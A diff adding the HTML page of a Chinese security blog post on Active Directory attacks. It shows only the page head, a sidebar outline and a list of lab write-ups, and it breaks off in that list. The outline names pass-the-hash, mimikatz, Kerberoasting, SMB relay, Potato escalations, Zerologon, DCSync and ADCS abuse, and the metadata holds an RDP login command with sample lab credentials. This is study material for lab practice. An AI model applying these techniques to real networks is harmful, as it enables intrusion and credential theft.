@@ -1,0 +1,1340 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>AD攻击 | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="Linux远程连接RDP# Using hostname or FQDN xfreerdp3 &#x2F;v:win10ent1.ad.lab &#x2F;u:&#39;john.doe&#39; &#x2F;p:&#39;P@$$word123!&#39;  # Using an IP address xfreerdp3 &#x2F;v:10.80.80.3 &#x2F;u:&#39;john.doe&#39; &#x2F;p:&#39;P@$$word123!&#39;  pass the hashpsexec.p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AD攻击">
+<meta property="og:url" content="http://ta0.fun/posts/636860d3/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="Linux远程连接RDP# Using hostname or FQDN xfreerdp3 &#x2F;v:win10ent1.ad.lab &#x2F;u:&#39;john.doe&#39; &#x2F;p:&#39;P@$$word123!&#39;  # Using an IP address xfreerdp3 &#x2F;v:10.80.80.3 &#x2F;u:&#39;john.doe&#39; &#x2F;p:&#39;P@$$word123!&#39;  pass the hashpsexec.p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250723223714575.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250723223851594.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250723224623267.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250726094954178.png">
+<meta property="og:image" content="https://ask.qcloudimg.com/http-save/yehe-5487096/b012828c3eceb6b299a9f9e7f12adde1.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250726202824014.png">
+<meta property="og:image" content="https://img.picgo.net/2024/08/08/image2a4b010a0a99baa0.png">
+<meta property="og:image" content="https://img.picgo.net/2024/08/08/imagece049666f6c29040.png">
+<meta property="article:published_time" content="2025-07-29T04:58:27.470Z">
+<meta property="article:modified_time" content="2025-07-29T05:00:16.133Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20250723223714575.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">140</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">29</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">210</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5RDP"><span class="toc-number">1.</span> <span class="toc-text">Linux远程连接RDP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-the-hash"><span class="toc-number">2.</span> <span class="toc-text">pass the hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-the-password"><span class="toc-number">3.</span> <span class="toc-text">pass the password</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-the-ticket"><span class="toc-number">4.</span> <span class="toc-text">pass the ticket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mimikatz"><span class="toc-number">5.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E"><span class="toc-number">6.</span> <span class="toc-text">哈希碰撞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-number">7.</span> <span class="toc-text">内网扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%9F%9F%E6%8E%A7ip"><span class="toc-number">8.</span> <span class="toc-text">寻找域控ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E4%B8%8A%E5%85%B1%E4%BA%AB%E7%9A%84%E8%AE%BF%E5%AE%A2%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-number">9.</span> <span class="toc-text">SMB上共享的访客访问权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BEldap"><span class="toc-number">10.</span> <span class="toc-text">枚举ldap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">11.</span> <span class="toc-text">用户枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-number">11.1.</span> <span class="toc-text">SMB用户枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kerbrute%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-number">11.2.</span> <span class="toc-text">kerbrute用户名枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldap%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-number">11.3.</span> <span class="toc-text">ldap用户名枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-IPC-%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="toc-number">11.4.</span> <span class="toc-text">使用 IPC$ 枚举用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">12.</span> <span class="toc-text">SMB密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS%E6%94%BB%E5%87%BB-111-2049"><span class="toc-number">13.</span> <span class="toc-text">NFS攻击(111,2049)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E6%9E%9A%E4%B8%BE-53"><span class="toc-number">14.</span> <span class="toc-text">DNS枚举(53)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%89%B9%E5%AE%9A%E8%AE%B0%E5%BD%95"><span class="toc-number">14.1.</span> <span class="toc-text">查找特定记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E"><span class="toc-number">14.2.</span> <span class="toc-text">DNS域传输漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%9F%A5"><span class="toc-number">14.3.</span> <span class="toc-text">反查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP3%E6%9E%9A%E4%B8%BE-110-25"><span class="toc-number">15.</span> <span class="toc-text">POP3枚举(110,25)*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E6%9E%9A%E4%B8%BE-3306"><span class="toc-number">16.</span> <span class="toc-text">Mysql枚举(3306)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E6%9E%9A%E4%B8%BE-1521"><span class="toc-number">17.</span> <span class="toc-text">Oracle枚举(1521)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSSQL%E6%9E%9A%E4%B8%BE-1433"><span class="toc-number">18.</span> <span class="toc-text">MSSQL枚举(1433)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%80%E5%9F%9F%E7%BD%91%E6%94%BB%E5%87%BB"><span class="toc-number">19.</span> <span class="toc-text">局域网攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IPv6-DNS%E6%AC%BA%E9%AA%97"><span class="toc-number">19.1.</span> <span class="toc-text">IPv6 DNS欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR-NBTNS-MDNS"><span class="toc-number">19.2.</span> <span class="toc-text">LLMNR&#x2F;NBTNS&#x2F;MDNS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">20.</span> <span class="toc-text">SMB中继攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0"><span class="toc-number">20.1.</span> <span class="toc-text">SMB 中继攻击概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%B7%B2%E7%A6%81%E7%94%A8-SMB-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%B8%BB%E6%9C%BA"><span class="toc-number">20.2.</span> <span class="toc-text">枚举已禁用 SMB 签名的主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B1%E5%AF%BC%E6%9C%BA%E5%99%A8%E5%8F%91%E9%80%81TNLM%E8%AE%A4%E8%AF%81"><span class="toc-number">21.</span> <span class="toc-text">诱导机器发送TNLM认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-Responder"><span class="toc-number">21.1.</span> <span class="toc-text">启动 Responder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB-1"><span class="toc-number">21.2.</span> <span class="toc-text">SMB中继攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AS-REP-Roasting%E6%94%BB%E5%87%BB"><span class="toc-number">22.</span> <span class="toc-text">AS-REP Roasting攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">23.</span> <span class="toc-text">Kerberoasting攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="toc-number">24.</span> <span class="toc-text">土豆家族</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS08-068-NTLM%E5%8F%8D%E5%B0%84Origin-Potato"><span class="toc-number">24.1.</span> <span class="toc-text">MS08-068 NTLM反射Origin Potato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2019-1384-Ghost-Potato"><span class="toc-number">24.2.</span> <span class="toc-text">CVE-2019-1384 Ghost Potato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS16-075-HOT-Potato"><span class="toc-number">24.3.</span> <span class="toc-text">MS16-075 HOT Potato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rotten-Potato"><span class="toc-number">24.4.</span> <span class="toc-text">Rotten Potato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Juicy-Potato"><span class="toc-number">24.5.</span> <span class="toc-text">Juicy Potato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sweet-Potato"><span class="toc-number">24.6.</span> <span class="toc-text">Sweet Potato</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Print-Spoofer"><span class="toc-number">24.7.</span> <span class="toc-text">Print Spoofer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RoguePotato"><span class="toc-number">24.8.</span> <span class="toc-text">RoguePotato</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-1675-Windows-Print-Spooler"><span class="toc-number">25.</span> <span class="toc-text">CVE-2021-1675 Windows Print Spooler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HiveNightmare"><span class="toc-number">26.</span> <span class="toc-text">HiveNightmare</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-1040"><span class="toc-number">27.</span> <span class="toc-text">CVE-2019-1040</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shadow-Credentials"><span class="toc-number">28.</span> <span class="toc-text">Shadow Credentials</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Keberos%E5%A7%94%E6%B4%BE"><span class="toc-number">29.</span> <span class="toc-text">Keberos委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%A7%94%E6%B4%BE"><span class="toc-number">29.1.</span> <span class="toc-text">枚举委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">29.2.</span> <span class="toc-text">非约束委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">29.3.</span> <span class="toc-text">约束委派</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-RBCD"><span class="toc-number">29.4.</span> <span class="toc-text">基于资源的约束委派(RBCD)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DACL%E6%BB%A5%E7%94%A8"><span class="toc-number">30.</span> <span class="toc-text">DACL滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GenericALL"><span class="toc-number">30.1.</span> <span class="toc-text">GenericALL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GeneriaWrite"><span class="toc-number">30.2.</span> <span class="toc-text">GeneriaWrite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">30.3.</span> <span class="toc-text">强制修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96LAPS-%E5%AF%86%E7%A0%81"><span class="toc-number">30.4.</span> <span class="toc-text">读取LAPS 密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96GMSA%E5%AF%86%E7%A0%81"><span class="toc-number">30.5.</span> <span class="toc-text">读取GMSA密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E7%BB%84%E5%92%8C%E7%89%B9%E6%9D%83"><span class="toc-number">31.</span> <span class="toc-text">特权组和特权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Account-Operators"><span class="toc-number">31.1.</span> <span class="toc-text">Account Operators</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Backup-Operators"><span class="toc-number">31.2.</span> <span class="toc-text">Backup Operators</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Server-Operators"><span class="toc-number">31.3.</span> <span class="toc-text">Server Operators</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeLoadDriverPrivilege"><span class="toc-number">31.4.</span> <span class="toc-text">SeLoadDriverPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeBackupPrivilege"><span class="toc-number">31.5.</span> <span class="toc-text">SeBackupPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-number">31.6.</span> <span class="toc-text">SeImpersonatePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeAssignPrimaryPrivilege"><span class="toc-number">31.7.</span> <span class="toc-text">SeAssignPrimaryPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeTcbPrivilege"><span class="toc-number">31.8.</span> <span class="toc-text">SeTcbPrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SeRestorePrivilege"><span class="toc-number">31.9.</span> <span class="toc-text">SeRestorePrivilege</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNSAdmins"><span class="toc-number">31.10.</span> <span class="toc-text">DNSAdmins</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync"><span class="toc-number">32.</span> <span class="toc-text">DCSync</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zerologon"><span class="toc-number">33.</span> <span class="toc-text">Zerologon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Runas"><span class="toc-number">34.</span> <span class="toc-text">Runas</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS"><span class="toc-number">35.</span> <span class="toc-text">ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1"><span class="toc-number">35.1.</span> <span class="toc-text">ESC1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC2"><span class="toc-number">35.2.</span> <span class="toc-text">ESC2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC3"><span class="toc-number">35.3.</span> <span class="toc-text">ESC3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC4"><span class="toc-number">35.4.</span> <span class="toc-text">ESC4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC6"><span class="toc-number">35.5.</span> <span class="toc-text">ESC6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC7"><span class="toc-number">35.6.</span> <span class="toc-text">ESC7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC8"><span class="toc-number">35.7.</span> <span class="toc-text">ESC8</span></a></li></ol></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li 